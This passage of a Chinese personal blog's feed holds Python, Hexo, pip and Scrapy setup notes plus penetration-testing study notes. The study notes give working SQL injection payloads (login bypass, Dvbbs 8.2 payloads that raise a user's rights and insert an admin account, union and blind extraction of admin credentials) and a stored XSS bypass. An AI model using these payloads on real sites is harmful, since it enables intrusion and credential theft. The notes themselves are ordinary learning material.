&#39;fact&#39;:&#39;1&#39;,</span><br><span class="line">         &#125;,</span><br><span class="line"></span><br><span class="line">    &#39;chengdu&#39;:&#123;</span><br><span class="line">        &#39;country&#39;:&#39;CN&#39;,</span><br><span class="line">        &#39;population&#39;:&#39;10000&#39;,</span><br><span class="line">        &#39;fact&#39;:&#39;1&#39;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#39;shanghai&#39;:&#123;</span><br><span class="line">        &#39;country&#39;:&#39;CN&#39;,</span><br><span class="line">        &#39;population&#39;:&#39;10000&#39;,</span><br><span class="line">        &#39;fact&#39;:&#39;1&#39;,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;</span><br><span class="line">s&#x3D;cities[&#39;shanghai&#39;][&#39;fact&#39;]</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for key in cities.values():</span><br><span class="line">    print(key[&#39;fact&#39;])</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;json文件地址:&lt;a href=&quot;http://www.arachni-scanner.com/reports/report.json&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.arachni-scanner.com/reports/report.json&lt;/a&gt;&lt;br&gt;下载保存为&lt;code&gt;test1.json&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;取出字典中的键值&quot;&gt;&lt;a href=&quot;#取出字典中的键值&quot; class=&quot;headerlink&quot; title=&quot;#取出字典中的键值&quot;&gt;&lt;/a&gt;#取出字典中的键值&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-73.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;import pymysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;import  json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;db &amp;#x3D; pymysql.connect(host&amp;#x3D;&amp;#39;localhost&amp;#39;,user&amp;#x3D;&amp;#39;root&amp;#39;,passwd&amp;#x3D;&amp;#39;saltneko&amp;#39;,db&amp;#x3D;&amp;#39;test3&amp;#39;) #连接数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cursor &amp;#x3D; db.cursor()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;filename&amp;#x3D;&amp;#39;&amp;#x2F;Users&amp;#x2F;salt&amp;#x2F;PycharmProjects&amp;#x2F;Study&amp;#x2F;test1.json&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;with open(filename, &amp;#39;rb&amp;#39;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Data &amp;#x3D; json.load(f)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    s &amp;#x3D; Data[&amp;#39;options&amp;#39;][&amp;#39;checks&amp;#39;] #直接取字典的键值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    i &amp;#x3D; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for a in s:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sql&amp;#x3D;&amp;#39;insert into web_loophole_type (Id,Web_loophole_type_description_en) values(&amp;#39; + str(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            i) + &amp;quot;,&amp;#39;&amp;quot; + a + &amp;quot;&amp;#39;&amp;quot; + &amp;#39;);&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cursor.execute(sql)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        db.commit()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        i &amp;#x3D; i + 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo的迁移（mac篇）</title>
    <link href="http://yoursite.com/2020/02/03/Hexo%E7%9A%84%E8%BF%81%E7%A7%BB%EF%BC%88mac%E7%AF%87%EF%BC%89/"/>
    <id>http://yoursite.com/2020/02/03/Hexo的迁移（mac篇）/</id>
    <published>2020-02-03T03:03:00.000Z</published>
    <updated>2020-02-03T03:07:09.280Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言：安装homebrew以及git（https-git-scm-com-）"><a href="#前言：安装homebrew以及git（https-git-scm-com-）" class="headerlink" title="#前言：安装homebrew以及git（https://git-scm.com/）"></a>#前言：安装homebrew以及git（<a href="https://git-scm.com/）" target="_blank" rel="noopener">https://git-scm.com/）</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot;</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="安装node-js以及npm"><a href="#安装node-js以及npm" class="headerlink" title="#安装node.js以及npm"></a>#安装node.js以及npm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install node</span><br><span class="line">brew install npm</span><br></pre></td></tr></table></figure><h3 id="进入blog直接运行"><a href="#进入blog直接运行" class="headerlink" title="#进入blog直接运行"></a>#进入blog直接运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>出现报错：<br><img src="/images/pasted-71.png" alt="upload successful"><br>尝试安装hexo-renderer-sass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install hexo-renderer-sass</span><br></pre></td></tr></table></figure><p>成功安装后依旧报错</p><h3 id="换源"><a href="#换源" class="headerlink" title="#换源"></a>#换源</h3><p>更换cnpm源 并尝试国内主流解决方案</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo npm i cnpm -g --registry&#x3D;http:&#x2F;&#x2F;registry.npm.taobao.org</span><br><span class="line">cnpm install node-sass@latest</span><br></pre></td></tr></table></figure><p>成功解决</p><h3 id="其他"><a href="#其他" class="headerlink" title="#其他"></a>#其他</h3><p><img src="/images/pasted-72.png" alt="upload successful"><br>问题的原因是node和hexo插件的版本…在node8.x的版本中，fs.SyncWriteStream被弃用<br>但是admin插件真的很好用（x 而且截图插入也很方便<br>所以依旧默默忍受着这行报错…</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言：安装homebrew以及git（https-git-scm-com-）&quot;&gt;&lt;a href=&quot;#前言：安装homebrew以及git（https-git-scm-com-）&quot; class=&quot;headerlink&quot; title=&quot;#前言：安装homebrew以及git（https://git-scm.com/）&quot;&gt;&lt;/a&gt;#前言：安装homebrew以及git（&lt;a href=&quot;https://git-scm.com/）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://git-scm.com/）&lt;/a&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;ruby -e &amp;quot;$(curl -fsSL https:&amp;#x2F;&amp;#x2F;raw.githubusercontent.com&amp;#x2F;Homebrew&amp;#x2F;install&amp;#x2F;master&amp;#x2F;install)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="教程" scheme="http://yoursite.com/categories/%E6%95%99%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>pip以及pip3安装</title>
    <link href="http://yoursite.com/2020/02/03/pip%E4%BB%A5%E5%8F%8Apip3%E5%AE%89%E8%A3%85/"/>
    <id>http://yoursite.com/2020/02/03/pip以及pip3安装/</id>
    <published>2020-02-03T02:46:00.000Z</published>
    <updated>2020-02-03T03:02:15.063Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前提"><a href="#前提" class="headerlink" title="#前提"></a>#前提</h3><p>安装2.7和3.6的情况下 没有pip3</p><h3 id="调试（1）"><a href="#调试（1）" class="headerlink" title="#调试（1）"></a>#调试（1）</h3><p><code>brew reinstall python3 --with-brewed-openssl</code><br>然而下载完毕后pip3的版本过低 按照提示更新<br><code>sudo pip3 install --upgrade pip</code><br>然而满屏报错…</p><a id="more"></a><p>另一种方法附上<br><a href="https://pip.pypa.io/en/stable/installing/" target="_blank" rel="noopener">https://pip.pypa.io/en/stable/installing/</a></p><h3 id="调试（2）"><a href="#调试（2）" class="headerlink" title="#调试（2）"></a>#调试（2）</h3><p>卸载重装<br><code>brew uninstall python3</code><br><code>brew install python3</code><br>再次更新pip3<br><code>sudo -H pip3 install --upgrade pip</code><br>更新成功</p><h3 id="调试（3）"><a href="#调试（3）" class="headerlink" title="#调试（3）"></a>#调试（3）</h3><p><code>pip -V</code><br><code>pip3 -v</code><br>显示结果全部指向python3.6</p><p>修改pip指向：<br><code>which pip</code><br>回显 /usr/local/bin/pip<br><code>sudo vim /usr/local/bin/pip</code><br>将python后修改为2.7版本<br><img src="/images/pasted-68.png" alt="upload successful"><br>按esc后输入：wq保存</p><h3 id="结果"><a href="#结果" class="headerlink" title="#结果"></a>#结果</h3><p><img src="/images/pasted-70.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;#前提&quot;&gt;&lt;/a&gt;#前提&lt;/h3&gt;&lt;p&gt;安装2.7和3.6的情况下 没有pip3&lt;/p&gt;
&lt;h3 id=&quot;调试（1）&quot;&gt;&lt;a href=&quot;#调试（1）&quot; class=&quot;headerlink&quot; title=&quot;#调试（1）&quot;&gt;&lt;/a&gt;#调试（1）&lt;/h3&gt;&lt;p&gt;&lt;code&gt;brew reinstall python3 --with-brewed-openssl&lt;/code&gt;&lt;br&gt;然而下载完毕后pip3的版本过低 按照提示更新&lt;br&gt;&lt;code&gt;sudo pip3 install --upgrade pip&lt;/code&gt;&lt;br&gt;然而满屏报错…&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="http://yoursite.com/categories/%E6%95%99%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>Python(2)</title>
    <link href="http://yoursite.com/2020/02/03/Python-2/"/>
    <id>http://yoursite.com/2020/02/03/Python-2/</id>
    <published>2020-02-03T02:43:00.000Z</published>
    <updated>2020-02-03T02:47:23.727Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sys模块"><a href="#sys模块" class="headerlink" title="#sys模块"></a>#sys模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">print sys.argv[0]</span><br></pre></td></tr></table></figure><p><code>sys.argv[0]</code>输出文件本身路径<br>所带参数从 <code>sys.argv[1]</code>开始</p><a id="more"></a><h3 id="字符串"><a href="#字符串" class="headerlink" title="#字符串"></a>#字符串</h3><p>最左：0 1 2 3 … <code>s[0:]</code><br>最右：… -3 -2 -1 <code>s[:-1]</code><br>开始截取时，包含了下边界，而截取到最大范围不包括上边界<br><code>print s 2</code> 输出字符串俩次</p><h3 id="字典映射替代switch"><a href="#字典映射替代switch" class="headerlink" title="#字典映射替代switch"></a>#字典映射替代switch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">def zero():</span><br><span class="line">    return &quot;zero&quot;</span><br><span class="line"></span><br><span class="line">def one():</span><br><span class="line">    return &quot;one&quot;</span><br><span class="line"></span><br><span class="line">def two():</span><br><span class="line">    return &quot;two&quot;</span><br><span class="line"></span><br><span class="line">def num2Str(arg):</span><br><span class="line">    switcher&#x3D;&#123;</span><br><span class="line">        0:zero,</span><br><span class="line">        1:one,</span><br><span class="line">        2:two,</span><br><span class="line">        3:lambda:&quot;three&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    func&#x3D;switcher.get(arg,lambda:&quot;nothing&quot;)</span><br><span class="line">    return func()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    print num2Str(0)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;sys模块&quot;&gt;&lt;a href=&quot;#sys模块&quot; class=&quot;headerlink&quot; title=&quot;#sys模块&quot;&gt;&lt;/a&gt;#sys模块&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;python&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# -*- coding: UTF-8 -*-&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;import sys&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print sys.argv[0]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;sys.argv[0]&lt;/code&gt;输出文件本身路径&lt;br&gt;所带参数从 &lt;code&gt;sys.argv[1]&lt;/code&gt;开始&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>三脚猫小套路</title>
    <link href="http://yoursite.com/2020/02/03/%E4%B8%89%E8%84%9A%E7%8C%AB%E5%B0%8F%E5%A5%97%E8%B7%AF/"/>
    <id>http://yoursite.com/2020/02/03/三脚猫小套路/</id>
    <published>2020-02-03T02:36:00.000Z</published>
    <updated>2020-02-03T02:47:08.874Z</updated>
    
    <content type="html"><![CDATA[<h3 id="扫站"><a href="#扫站" class="headerlink" title="#扫站"></a>#扫站</h3><p>1.1 Nmap端口扫描<br><img src="/images/pasted-65.png" alt="upload successful"></p><a id="more"></a><p>1.2 通过web访问端口 若可以访问 再用对应脚本扫<br><img src="/images/pasted-66.png" alt="upload successful"><br>1.3 进行poc攻击<br><img src="/images/pasted-67.png" alt="upload successful"><br>命令行：whoiam/ls</p><h3 id="svn源码泄露"><a href="#svn源码泄露" class="headerlink" title="#svn源码泄露"></a>#svn源码泄露</h3><p>2.1 扫描目录存在.svn<br>2.2 尝试访问/.svn/entries<br>2.3 使用Seay_svn 可将网页全部源码download</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;扫站&quot;&gt;&lt;a href=&quot;#扫站&quot; class=&quot;headerlink&quot; title=&quot;#扫站&quot;&gt;&lt;/a&gt;#扫站&lt;/h3&gt;&lt;p&gt;1.1 Nmap端口扫描&lt;br&gt;&lt;img src=&quot;/images/pasted-65.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>基础扫描工具的使用</title>
    <link href="http://yoursite.com/2020/02/03/%E5%9F%BA%E7%A1%80%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2020/02/03/基础扫描工具的使用/</id>
    <published>2020-02-03T02:27:00.000Z</published>
    <updated>2020-02-03T02:36:27.144Z</updated>
    
    <content type="html"><![CDATA[<h3 id="awvs扫描器扫描web漏洞"><a href="#awvs扫描器扫描web漏洞" class="headerlink" title="#awvs扫描器扫描web漏洞"></a>#awvs扫描器扫描web漏洞</h3><p>1.1基本使用<br><code>new scan</code>创建新的任务网站 默认next无需修改<br>1.2高级使用<br>site crawler<br>爬虫功能，遍历站点目录结构 点击在<code>tool</code>中的<code>site crawler target finder</code><br>端口扫描，找出web服务器 点击在<code>tool</code>中的<code>target finder</code>(目标服务器http端口）</p><a id="more"></a><h3 id="御剑web后台敏感目录扫描"><a href="#御剑web后台敏感目录扫描" class="headerlink" title="#御剑web后台敏感目录扫描"></a>#御剑web后台敏感目录扫描</h3><p>2.1 扫描后寻找类似于admin login 点击寻找后台登陆</p><h3 id="APPscan扫描器扫描web漏洞"><a href="#APPscan扫描器扫描web漏洞" class="headerlink" title="#APPscan扫描器扫描web漏洞"></a>#APPscan扫描器扫描web漏洞</h3><p>3.11 单击文件——》新建<br>3.12 选择常规扫描（不必勾选<code>启动扫描配置向导</code>）<br>3.13 选择web程序扫描<br>3.14 输入URL 勾线仅扫描此目录下链接<br>3.15 默认登陆方法：记录<br>3.16 弹窗选择<code>是</code><br>3.17 测试策略选择默认<code>default</code><br>3.18 选择启动全面自动扫描<br>3.19 自动保存对话框中 选择<code>是</code><br>3.20 扫描完成后 点击应用建议<br>3.21 点击报告 导出生成pdf格式文档</p><h3 id="SQL注入原理-万能密码注入"><a href="#SQL注入原理-万能密码注入" class="headerlink" title="#SQL注入原理 -万能密码注入"></a>#SQL注入原理 -万能密码注入</h3><p>4.1 输入框万能密码注入<br>username=username<br>password=2’or’1<br><code>[Select user_id,user_type,email from Where user_id=&#39;username&#39; And password=&#39;2&#39;]</code>or<code>[&#39;1&#39;]</code> 恒为True</p><h3 id="动网论坛8-2经典注入漏洞利用"><a href="#动网论坛8-2经典注入漏洞利用" class="headerlink" title="#动网论坛8.2经典注入漏洞利用"></a>#动网论坛8.2经典注入漏洞利用</h3><p>5.1 例：注册新用户<br>username=san<br>password=123456<br>5.2退出用户 在登录框输入<code>san&#39;and&#39;a&#39;=a</code><br>即<code>[&#39;password=san&#39;]</code>and<code>[&#39;a&#39;=&#39;a&#39;]</code><br>判断相等<br>5.3 在登陆框输入san’and’a’=’b<br>即[‘password=san’]and[‘a’=’b’]<br>不等 判断用户名不存在<br>5.4 输入提权<code>san&#39;and&#39;a&#39;=&#39;b&#39;;update dv_user set usergroupid=1 where username=&#39;san&#39;--</code><br>重新用正确的用户名密码登陆，此时已是前台管理员身份<br>5.5 退出用户 在登录框输入<code>san&#39;;insert into dv_admin (username,password,flag,adduser) values(&#39;san&#39;,&#39;49ba59abbe56e057&#39;,&#39;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45&#39;,&#39;san&#39;)--</code><br>密码输入为正确密码 49ba59abbe56e057为12345的cmd16位密文<br>打开后台管理员界面 用正确的用户名和密码登陆 可以成功登陆</p><h3 id="SQL注入原理-手工注入access数据库"><a href="#SQL注入原理-手工注入access数据库" class="headerlink" title="#SQL注入原理-手工注入access数据库"></a>#SQL注入原理-手工注入access数据库</h3><p>6.1 在<code>[.asp?id=xxx（数字任意）]</code>后加语句<code>[&#39;]</code>(错误）<code>[and 1=1]</code>（成功）<code>[and 1=2]</code>（错误）<br>判断是否存在注入点<br>6.2 连接末尾添加<code>and exists(select * from admin)</code>猜解表名admin<br>6.31 连接末尾添加<code>and exists(select admin from admin)</code> 猜解列名admin<br>6.32 同样连接末尾添加<code>and exists(select password from admin)</code> 猜解列名password<br>6.41 连接末尾添加<code>and (select top 1 len (admin) from admin）&gt;1</code> admin&gt;x x数字依次增加直到可以正常访问，字段长度即为x<br>6.42 同理连接末尾添加<code>and (select top 1 asc(mid(admin,1,1))from admin)&gt;97</code>可以正常访问<br>可知第一条记录的第一位字符ASCII码为97 对应a<br>*asc(mid(admin,1,1)) 即从第一个开始，取admin字符串中的一个字符</p><h3 id="SQL注入原理-手工联合查询注入技术"><a href="#SQL注入原理-手工联合查询注入技术" class="headerlink" title="#SQL注入原理-手工联合查询注入技术"></a>#SQL注入原理-手工联合查询注入技术</h3><p>7.1 在<code>[.asp?id=xxx（数字任意）]</code>后加语句<code>order by xxx</code>（数字任意） 根据页面返回结果判断站点中的字段数目 若xxx=n时不能访问，字段数目即为n-1<br>7.2 例：在连接后面添加<code>union select 1 ,2,3,4,5,6,7,8,9,10,11 from admin</code>【案例的网站字段数目为11】 页面显示2，3<br>7.3 在连接后面添加<code>union select 1 ,admin,password,4,5,6,7,8,9,10,11 from admin</code> 即可爆出管理员用户名和密码</p><h3 id="DVWA之php-mysql手工注入"><a href="#DVWA之php-mysql手工注入" class="headerlink" title="#DVWA之php+mysql手工注入"></a>#DVWA之php+mysql手工注入</h3><p>8.11 输入<code>[1]</code> 有回显 说明此处为注入点<br>8.12 输入<code>[&quot;&quot;]</code>返回错误<br>8.13 猜测数字类型注入 输入<code>[1 or 1=1]</code> 尝试遍历<br>8.14 猜测程序将此处看成了字符型 输入<code>[1&#39; or &#39;1&#39;=&#39;1]</code>成功遍历<br><img src="/images/pasted-63.png" alt="upload successful"><br>8.15 输入<code>1&#39; order by 1 --</code>（*–后有空格） 依次增加 到3到时候报错 即判断查询结果值为2例<br>8.16 参数注入<code>1&#39; and 1=2 select 1,2 --</code></p><h3 id="跨站脚本攻击之存储型"><a href="#跨站脚本攻击之存储型" class="headerlink" title="#跨站脚本攻击之存储型"></a>#跨站脚本攻击之存储型</h3><p>9.1 文本框存在字数限制<br>用注释的方式绕过<br>提交<code>*/&lt;/script&gt;</code><br>再提交<code>&lt;script&gt;alert(/xss/)/*</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;awvs扫描器扫描web漏洞&quot;&gt;&lt;a href=&quot;#awvs扫描器扫描web漏洞&quot; class=&quot;headerlink&quot; title=&quot;#awvs扫描器扫描web漏洞&quot;&gt;&lt;/a&gt;#awvs扫描器扫描web漏洞&lt;/h3&gt;&lt;p&gt;1.1基本使用&lt;br&gt;&lt;code&gt;new scan&lt;/code&gt;创建新的任务网站 默认next无需修改&lt;br&gt;1.2高级使用&lt;br&gt;site crawler&lt;br&gt;爬虫功能，遍历站点目录结构 点击在&lt;code&gt;tool&lt;/code&gt;中的&lt;code&gt;site crawler target finder&lt;/code&gt;&lt;br&gt;端口扫描，找出web服务器 点击在&lt;code&gt;tool&lt;/code&gt;中的&lt;code&gt;target finder&lt;/code&gt;(目标服务器http端口）&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Scrapy在Mac上的安装</title>
    <link href="http://yoursite.com/2020/02/03/Scrapy%E5%9C%A8Mac%E4%B8%8A%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <id>http://yoursite.com/2020/02/03/Scrapy在Mac上的安装/</id>
    <published>2020-02-03T02:26:00.000Z</published>
    <updated>2020-02-03T02:26:59.828Z</updated>
    
    <content type="html"><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="#准备工作"></a>#准备工作</h3><p>若你的Mac OS系统为10.11或更高版本：<br>1.重新启动Mac OS<br>2.重启时按住Command+R，进入Recovery模式<br>3.选择实用工具里的终端并输入:<br>csrutil disable;<br>4.重新启动，回到Mac OS</p><a id="more"></a><h3 id="安装Scapy"><a href="#安装Scapy" class="headerlink" title="#安装Scapy"></a>#安装Scapy</h3><p>sudo -H pip install Scrapy</p><h3 id="测试"><a href="#测试" class="headerlink" title="#测试"></a>#测试</h3><p>scrapy version</p><h3 id="后续"><a href="#后续" class="headerlink" title="#后续"></a>#后续</h3><p>1.重新启动Mac OS<br>2.重启时按住Command+R，进入Recovery模式<br>3.选择实用工具里的终端并输入:<br>csrutil enable;<br>4.重新启动，回到Mac OS</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;#准备工作&quot;&gt;&lt;/a&gt;#准备工作&lt;/h3&gt;&lt;p&gt;若你的Mac OS系统为10.11或更高版本：&lt;br&gt;1.重新启动Mac OS&lt;br&gt;2.重启时按住Command+R，进入Recovery模式&lt;br&gt;3.选择实用工具里的终端并输入:&lt;br&gt;csrutil disable;&lt;br&gt;4.重新启动，回到Mac OS&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="http://yoursite.com/categories/%E6%95%99%E7%A8%8B/"/>
    
    
  </entry>
  
</feed>
